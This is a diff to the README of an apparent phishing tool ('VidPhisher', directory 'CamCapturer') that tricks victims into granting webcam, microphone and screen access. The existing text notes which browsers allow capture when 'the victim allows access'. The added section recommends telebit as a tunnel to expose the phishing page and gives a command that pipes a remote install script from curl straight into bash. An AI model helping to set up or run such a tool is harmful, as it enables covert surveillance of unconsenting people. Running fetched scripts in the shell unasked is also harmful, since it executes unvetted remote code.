@@ -55,5 +55,10 @@ All of the necessary depenencies will be installed automatically in first run!
 Edge do not suport video capturing. Only audio can be captured from it. Only Firefox supports screen capturing additionally. And most of the rests support video and audio. If browser doesn't block VidPhisher and the victim allows access only then you can capture video/audio
 
 
+### [+] Use telebit as a tunneler
+
+- install telebiy`curl https://get.telebit.io/ | bash`
+- `cd CamCapturer`
+
 <p text align = "center">🍏 Good Luck 😆 </p>
 <h6 text align = "right">Kuczi$</h6>
